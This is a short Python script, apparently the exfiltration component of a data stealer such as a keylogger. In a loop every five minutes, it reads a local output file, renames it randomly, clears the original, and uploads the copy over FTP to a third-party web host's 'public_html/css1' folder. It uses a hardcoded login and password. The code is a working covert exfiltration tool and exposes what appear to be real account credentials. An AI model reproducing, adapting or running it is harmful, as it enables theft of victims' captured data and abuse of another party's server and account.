#coding:utf-8
from ftplib import FTP  
import time 
import random
print ("""
############################
# Coder: Cüneyt TANRISEVER #
############################
""")
say=0
def dex1():
    global dexalfabem
    dexalfabem=["a","b","c","d","f","e","g","h","i","j","k","l","m","n","o","u","p","r","s","t","v","y","z"]
    cuneyt= random.randint(1000, 9999)
    cuneyt1= random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)
    cuneyt2= random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)
    dexm=cuneyt1+str(cuneyt)+cuneyt2
    dexd="ciktial%s.txt"%(dexm)
    return dexd

while True:
	oku=open("ciktial.txt","r")
	oku1=oku.read()
	oku.close()
	yeni=dex1()
	yaz=open(yeni,"a")
	yaz.write(str(oku1))
	yaz.close()
	dex2= open(yeni, 'r')
	deld=dex2.read()
	#print deld
	if deld=='':
		#print "boooooooooooooooooooos"
		pass
	else:
		print yeni
		oku2=open("ciktial.txt","w")
		oku2.close()
		dex=open(yeni,"rb")
		yeni=dex1()
		#print yeni
		ftp = FTP('ftp.accountant2u.com.my')
		ftp.login('accounta', 'i6vjxAgrxd')
		ftp.cwd('/public_html/css1')
		yeni1="1"+yeni
		print yeni1
		ftp.storbinary('STOR %s' % yeni1, dex)
		print yeni1
		ftp.quit()

	time.sleep(300)







